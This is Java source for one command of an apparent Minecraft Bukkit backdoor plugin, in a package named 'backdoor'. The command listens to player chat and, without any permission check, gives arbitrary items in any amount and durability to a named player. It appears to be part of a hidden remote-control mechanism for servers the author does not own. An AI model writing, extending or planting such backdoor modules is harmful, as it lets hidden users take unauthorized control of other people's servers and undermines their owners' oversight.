package me.kmatias.backdoor.commands;

import me.kmatias.backdoor.Command;
import me.kmatias.backdoor.RegisterCommand;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.entity.Damageable;
import org.bukkit.event.player.PlayerChatEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;

import java.util.ArrayList;

@RegisterCommand(displayName = "give", aliases = {"give"})
public class GiveCommand extends Command {

    @Override
    public void onExec(PlayerChatEvent event, ArrayList<String> args) {

        if (args.size() >= 4) {
            Material material = Material.matchMaterial(args.get(1));

            if (material == null) {
                event.getPlayer().sendMessage(ChatColor.RED + "That material does not exist, make sure you are using the correct naming. For example: CAVE_SPIDER_SPAWN_EGG");
                return;
            }

            ItemStack stack = new ItemStack(material);
            stack.setAmount(Integer.parseInt(args.get(2)));

            ItemMeta meta = stack.getItemMeta();
            stack.setItemMeta(meta);

            stack.setDurability(Short.parseShort(args.get(3)));



            Bukkit.getPlayer(args.get(0)).getInventory().addItem(stack);
        }
    }
}
